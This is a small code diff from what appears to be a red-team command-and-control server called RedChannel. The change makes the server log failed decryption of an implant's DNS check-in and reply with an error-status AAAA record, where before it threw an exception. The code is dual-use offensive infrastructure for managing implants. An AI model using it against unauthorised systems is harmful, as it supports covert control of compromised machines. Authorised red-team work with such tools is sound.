@@ -731,7 +731,15 @@ export default class RedChannel {
                 throw new Error(`invalid agent response proto`);
             }
         } catch (ex) {
-            throw new Error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
+            this.log.error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
+            return [
+                {
+                    name: hostname,
+                    type: C2AnswerType.TYPE_AAAA,
+                    data: this.makeIpString(implant.C2ResponseStatus.ERROR_DECRYPTING_MESSAGE),
+                    ttl: Config.C2_ANSWER_TTL_SECS,
+                },
+            ];
         }
         if (!agentData) {
             throw new Error(`agent response payload is invalid for ${agentId}`);
